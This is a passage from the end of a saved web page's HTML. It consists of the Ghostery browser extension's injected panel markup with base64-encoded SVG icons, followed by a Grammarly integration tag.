yMywxMS43MzY1MjIyIDkuNTg4NzYyMjQsMTEuNzM2NTIyMiBDMTAuMTk0NjYyOCwxMS43MzY1MjIyIDEwLjcwMTIwMzUsMTEuMzk0OTcyNSAxMC44MjM0NTUyLDEwLjkxNjU1OTQgQzEwLjk0NTcwNjgsMTEuMzk0OTcyNSAxMS40NTIyNDc1LDExLjc4OTM2OCAxMi4wNTgyNjk5LDExLjc4OTM2OCBDMTIuMzUzNjcwOCwxMS43ODkzNjggMTIuNjI0NzE4OCwxMS42OTkzODQgMTIuODM5NzU1LDExLjU1OTU5ODIgQzExLjAwOTUxMTUsOC43MTgwOTk3NSAxMi4xNDUzMzE2LDQuMTM3NjgxMTYgMTIuMTQ1MzMxNiw0LjEzNzY4MTE2IEM2Ljk0NjQ3MDYzLDUuMjMxNjE0MjQgNC42NjU4MTk4NSwxMC4xMDAzNzE0IDQuMDU3OTcxMDEsMTEuNjY2MTQyMiBDNC4yMzI5NDY3MywxMS43NDMyMTkyIDQuNDMxNzg4MzEsMTEuNzg5ODU1MSA0LjY0MjkyODExLDExLjc4OTg1NTEgWiIgaWQ9Indhcm5pbmd0cmFja2VycyI+PC9wYXRoPg0KICAgICAgICAgICAgPC9nPg0KICAgICAgICA8L2c+DQogICAgPC9nPg0KPC9zdmc+&quot;); opacity: 0.5;"></span></div>
            <div id="ghostery-title">Looking</div>
            <div id="ghostery-minimize"><span id="ghostery-minimize-icon"></span></div><span id="ghostery-close" style="background: url(&quot;data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+DQo8c3ZnIHdpZHRoPSIxNXB4IiBoZWlnaHQ9IjE1cHgiIHZpZXdCb3g9IjAgMCAxNSAxNSIgdmVyc2lvbj0iMS4xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4NCiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDMuNy4yICgyODI3NikgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+DQogICAgPHRpdGxlPmNvbGxhcHNlIGNvcHkgMjwvdGl0bGU+DQogICAgPGRlc2M+Q3JlYXRlZCB3aXRoIFNrZXRjaC48L2Rlc2M+DQogICAgPGRlZnM+PC9kZWZzPg0KICAgIDxnIGlkPSJQdXJwbGUtQm94IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4NCiAgICAgICAgPGcgaWQ9ImNvbGxhcHNlLWNvcHktMiI+DQogICAgICAgICAgICA8Y2lyY2xlIGlkPSJPdmFsLTMxNSIgZmlsbC1vcGFjaXR5PSIwLjI3MDE1Mzk4NiIgZmlsbD0iI0Q4RDhEOCIgY3g9IjcuNSIgY3k9IjcuNSIgcj0iNy41Ij48L2NpcmNsZT4NCiAgICAgICAgICAgIDxwYXRoIGQ9Ik00LjM2LDQuMzYgTDEwLjU3NDU2MzQsMTAuNTc0NTYzNCIgaWQ9IkxpbmUiIHN0cm9rZT0iI0ZGRkZGRiIgc3Ryb2tlLWxpbmVjYXA9InNxdWFyZSI+PC9wYXRoPg0KICAgICAgICAgICAgPHBhdGggZD0iTTQuMzYsNC4zNiBMMTAuNTc0NTYzNCwxMC41NzQ1NjM0IiBpZD0iTGluZS1Db3B5IiBzdHJva2U9IiNGRkZGRkYiIHN0cm9rZS1saW5lY2FwPSJzcXVhcmUiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDcuNjAwMDAwLCA3LjYwMDAwMCkgc2NhbGUoLTEsIDEpIHRyYW5zbGF0ZSgtNy42MDAwMDAsIC03LjYwMDAwMCkgIj48L3BhdGg+DQogICAgICAgIDwvZz4NCiAgICA8L2c+DQo8L3N2Zz4=&quot;);"></span>
        </div>
        <div id="ghostery-pb-background">
            <div id="ghostery-trackerList"></div>
        </div>
    </div>
</body>
<grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration>

</html>